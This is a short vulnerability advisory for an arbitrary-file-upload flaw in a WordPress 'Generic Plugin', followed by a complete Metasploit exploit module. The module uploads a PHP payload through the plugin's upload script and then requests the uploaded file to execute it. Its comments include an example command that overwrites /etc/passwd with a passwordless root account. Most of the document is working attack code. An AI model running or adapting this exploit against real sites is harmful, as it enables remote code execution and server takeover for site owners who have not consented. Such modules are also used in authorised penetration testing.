source: http://www.securityfocus.com/bid/54440/info

The Generic Plugin for WordPress is prone to an arbitrary-file-upload vulnerability.

An attacker can exploit this issue to upload arbitrary PHP code and run it in the context of the Web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Generic Plugin 0.1 is vulnerable; other versions are also affected. 

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
  super(update_info(info,
  'Name' => 'WordPress Generic plugins Arbitrary File Upload',
  'Description' => %q{
   This module exploits an arbitrary PHP File Upload and Code Execution flaw in some
  WordPress blog software plugins. The vulnerability allows for arbitrary file upload 
  and remote code execution POST Data to Vulnerable Script/File in the plugin.
   },
   'Author' => [ 'KedAns-Dz <ked-h[at]1337day.com>' ], # MSF Module
   'License' => MSF_LICENSE,
   'Version' => '0.1', # Beta Version Just for Pene-Test/Help - Wait the Best !
   'References' => [ 
     'URL', 'http://1337day.com/related/18686',
     'URL', 'http://packetstormsecurity.org/search/?q=wordpress+shell+upload' 
  ],
   'Privileged' => false,
   'Payload' =>
    {
    'Compat'  => { 'ConnectionType' => 'find', },
    },
    'Platform'       => 'php',
    'Arch'           => ARCH_PHP,
    'Targets'        => [[ 'Automatic', { }]],
    'DisclosureDate' => 'Jun 16 2012',
    'DefaultTarget' => 0))

   register_options(
    [
     OptString.new('TARGETURI', [true, "The URI path to WordPress", "/"]),
     OptString.new('PLUGIN', [true, "The Full URI path to Plugin and Vulnerable File", "/"]),
     OptString.new('UDP', [true, "Full Path After Upload", "/"])
    # Example :
    # set TARGETURI http://127.0.0.1/wp
    # set PLUGIN wp-content/plugins/foxypress/uploadify/uploadify.php
    # set UDP wp-content/affiliate_images/
    # set RHOST 127.0.0.1
    # set PAYLOAD php/exec
    # set CMD echo "toor::0:0:::/bin/bash">/etc/passwd
    # exploit
    ], self.class)
  end

   def check
    uri = datastore['TARGETURI']
    plug = datastore['PLUGIN']
  
    res = send_request_cgi({
    'method' => 'GET',
    'uri' => "#{uri}'/'#{plug}"
    })
    
 if res and res.code == 200
   return Exploit::CheckCode::Detected
  else
   return Exploit::CheckCode::Safe
   end
 end

  def exploit

   uri = datastore['TARGETURI']
   plug = datastore['PLUGIN']
   path = datastore['UDP']
 
   peer = "#{rhost}:#{rport}"

   post_data = Rex::MIME::Message.new
   post_data.add_part("<?php #{payload.encoded} ?>",
   "application/octet-stream", nil, 
   "form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(6)}.php\"")

   print_status("#{peer} - Sending PHP payload")

  res = send_request_cgi({
  'method' => 'POST',
  'uri'    => "#{uri}'/'#{plug}",
  'ctype'  => 'multipart/form-data; boundary=' + post_data.bound,
  'data'   => post_data.to_s
  })

   if not res or res.code != 200 or res.body !~ /\{\"raw_file_name\"\:\"(\w+)\"\,/
   print_error("#{peer} - File wasn't uploaded, aborting!")
   return
   end

   print_good("#{peer} - Our payload is at: #{$1}.php! Calling payload...")
   res = send_request_cgi({
   'method' => 'GET',
   'uri'    => "#{uri}'/'#{path}'/'#{$1}.php"
   })

   if res and res.code != 200
   print_error("#{peer} - Server returned #{res.code.to_s}")
   end

   end

end